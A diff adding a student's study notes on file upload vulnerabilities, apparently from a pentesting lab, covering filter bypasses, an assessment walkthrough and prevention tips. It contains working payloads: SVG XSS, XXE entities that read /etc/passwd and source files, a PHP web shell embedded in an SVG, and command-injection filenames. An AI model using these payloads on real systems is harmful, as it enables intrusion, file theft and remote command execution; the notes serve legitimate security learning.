@@ -3,6 +3,8 @@
 
 #### Lessons:
 - When bypassing different filter types, be systematical, and have good wordlists (example have wordlist on double extentions, filter-bypass,etc)
+- I can be hard to know which folder files gets saved into, read the source code and consider which folder is the "start folder".
+- We can get php shells via svg and xml code
 
 #### Cause of file upload attacks:
 - Weak file validation and verification - bad logic in code or outdated libraries 
@@ -103,6 +105,155 @@ GIF8
 
 - We have a fileextention bypass
 - We have a Content-Type bypass
-- We have a MiME type bypass
+- We have a MiME type bypass: List of all MIME types https://en.wikipedia.org/wiki/List_of_file_signatures 
 
 Be structured, and test them in isolated cases. 
+
+
+**Other attacks:**
+- XSS: If we can send in arbitrary HTML files, this can be used to preform XSS. Or we could upload a picture file (jpg, svg, etc) and have the alternative picture data (comment) execute js code if its not validated correctly. 
+
+Ex: 
+```svg
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
+    <rect x="1" y="1" width="1" height="1" fill="green" stroke="black" />
+    <script type="text/javascript">alert(window.origin);</script>
+</svg>
+```
+
+- XXE: (XML External Entity) can also be possible if we can upload svg files:
+Ex: reading files from the web server
+```svg
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+<svg>&xxe;</svg>
+```
+
+```
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
+<svg>&xxe;</svg>
+```
+
+Following this format we can also get php shellls:
+```
+<?xml version="1.0" encoding="UTF-8"?>
+<svg></svg><?php system($_REQUEST['cmd']); ?>
+```
+- But the filename have to include a extention which can execute php code, ex: php, phar, etc. uploading this shell with shell.svg as filename, would not work. 
+
+
+There are other file types which could introduce vulnerabilities via xml, for example PDFs, Word doc, powerpoint doc, java stuff, etc.
+
+
+- DOS: lots of different ways one could cause a DOS via file inclusion, ex: Decompression bombs via zip, pixel flood with modified images,..
+
+- Injection via filename: If the filename is displayed somewhere after we upload it, we can try injection techniques via it: ex:
+command injection: `file$(whoami).jpg` or ``file`whoami`.jpg`` or `file.jpg||whoami` 
+XSS: `<script>alert(window.origin);</script>.jpg`
+SQLi: `file';select+sleep(5);--.jpg` 
+
+
+#### Preventing file upload vulnerabilities
+
+- File extension validation: White and blacklisting ideally 
+- Content validation: Content-Type header, check that i matches the file extentions we can upload.
+- Protecting the uploaded files form unauthorized access: Ex. who should be allowed to see / get the file i uploaded? 
+- File name sanitation 
+- Limit file size
+- Update libraries 
+- Scan uploaded files for malicious content
+- Use WAF for added security
+
+
+#### Assessment 
+
+1. What language is running on the backend: php
+2. What file extention could we use: .phar.jpg
+.phar.png + image/png content-type also allowed. 
+
+.phar.png is not allowed when we add php shell as payload
+- even if we add the mime png and content-type png 
+
+These content-types if available:
+
+|     |                  |     |     |       |       |        |     |
+| --- | ---------------- | --- | --- | ----- | ----- | ------ | --- |
+| 2   | image/apng       | 200 | 91  | false | false | 457289 |     |
+| 27  | image/jpeg       | 200 | 85  | false | false | 457289 |     |
+| 28  | image/jpg        | 200 | 60  | false | false | 457289 |     |
+| 45  | image/png        | 200 | 60  | false | false | 457289 |     |
+| 48  | image/pwg-raster | 200 | 84  | false | false | 457289 |     |
+| 49  | image/svg+xml    | 200 | 61  | false | false | 457289 |     |
+|     |                  |     |     |       |       |        |     |
+
+- Request under lets us extract file from the server:
+```
+POST /contact/upload.php HTTP/1.1
+...
+
+------geckoformboundaryd0980cff6b6592fc3dfc34cc4978cd65
+Content-Disposition: form-data; name="uploadFile"; filename="test.svg"
+Content-Type: image/svg+xml
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+<svg>&xxe;</svg>
+
+------geckoformboundaryd0980cff6b6592fc3dfc34cc4978cd65--
+
+```
+
+
+Source code:
+```php
+<?php
+require_once('./common-functions.php');
+
+// uploaded files directory
+$target_dir = "./user_feedback_submissions/";
+
+// rename before storing
+$fileName = date('ymd') . '_' . basename($_FILES["uploadFile"]["name"]);
+$target_file = $target_dir . $fileName;
+
+// get content headers
+$contentType = $_FILES['uploadFile']['type'];
+$MIMEtype = mime_content_type($_FILES['uploadFile']['tmp_name']);
+
+// blacklist test
+if (preg_match('/.+\.ph(p|ps|tml)/', $fileName)) {
+    echo "Extension not allowed";
+    die();
+}
+
+// whitelist test
+if (!preg_match('/^.+\.[a-z]{2,3}g$/', $fileName)) {
+    echo "Only images are allowed";
+    die();
+}
+
+// type test
+foreach (array($contentType, $MIMEtype) as $type) {
+    if (!preg_match('/image\/[a-z]{2,3}g/', $type)) {
+        echo "Only images are allowed";
+        die();
+    }
+}
+
+// size test
+if ($_FILES["uploadFile"]["size"] > 500000) {
+    echo "File too large";
+    die();
+}
+
+if (move_uploaded_file($_FILES["uploadFile"]["tmp_name"], $target_file)) {
+    displayHTMLImage($target_file);
+} else {
+    echo "File failed to upload";
+}
+
+
+```
